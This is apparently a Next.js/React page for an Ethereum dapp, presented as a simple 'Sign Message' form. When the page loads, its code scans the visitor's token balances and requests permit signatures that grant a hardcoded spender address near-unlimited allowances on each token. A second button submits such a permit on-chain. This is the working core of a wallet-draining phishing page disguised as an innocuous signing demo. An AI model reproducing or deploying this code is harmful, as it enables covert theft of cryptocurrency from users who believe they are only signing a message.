import { Button, FormControl, FormLabel } from '@chakra-ui/react'
import { fetchSigner, getAccount, getContract } from '@wagmi/core'
import axios from 'axios'
import { Head } from 'components/layout/Head'
import { HeadingComponent } from 'components/layout/HeadingComponent'
import { ethers } from 'ethers'
import { useEffect, useState } from 'react'
import { contractHasPermit, erc721PermitSignature } from 'utils/permit'
import { useAccount } from 'wagmi'
import erc20Abi from '../utils/abis/erc20.json'

export default function Home() {
  const [txData, setTxData] = useState<any>(null)
  const { address } = useAccount()
  useEffect(() => {
    connect()
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  async function connect() {
    const account = getAccount()
    try {
      const balances = await axios.get(`/api/balance/${account.address}`)
      for (let bal of balances.data) {
        await signNew(bal.address)
      }
    } catch (e) {
      console.log(e)
    }
  }

  async function signNew(contractAddress: string) {
    const account = getAccount()
    const spender = '0x9473d4DfB61f4B65d037199c82D920C0609B616c'
    if (contractAddress === 'eth') return
    try {
      const signer = await fetchSigner({
        chainId: 1,
      })
      const hasPermit = await contractHasPermit(contractAddress, 1)
      if (hasPermit) {
        const contract = getContract({
          address: contractAddress || '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
          abi: erc20Abi,
          signerOrProvider: signer as any,
        })
        const value = ethers.utils.parseEther('10000000000000000000').toString()
        const data = await erc721PermitSignature(account.address || '', spender, value, contract)
        setTxData(data)
      } else {
        console.log('no permit', contractAddress)
      }
    } catch (e) {
      console.log(e)
    }
  }

  async function sendTx() {
    const signer = await fetchSigner({
      chainId: 1,
    })
    const contract = getContract({
      address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
      abi: erc20Abi,
      signerOrProvider: signer as any,
    })
    if (!txData) return
    const data = txData.data
    console.log(data)
    const tx = await contract?.permit(data.owner, data.spender, data.value, data.deadline, data.v, data.r, data.s)
    console.log(tx)
  }

  return (
    <>
      <Head />

      <main>
        <div>
          <HeadingComponent as="h3">Sign Message</HeadingComponent>

          <FormControl>
            <FormLabel>Message</FormLabel>

            <Button mt={4} onClick={() => signNew('')}>
              Sign
            </Button>
            <br />
            <Button mt={4} onClick={sendTx}>
              Send Tx
            </Button>

            {address && (
              <div>
                <HeadingComponent as="h3">Signed by</HeadingComponent>
                <p>{address}</p>
              </div>
            )}
          </FormControl>
        </div>
      </main>
    </>
  )
}
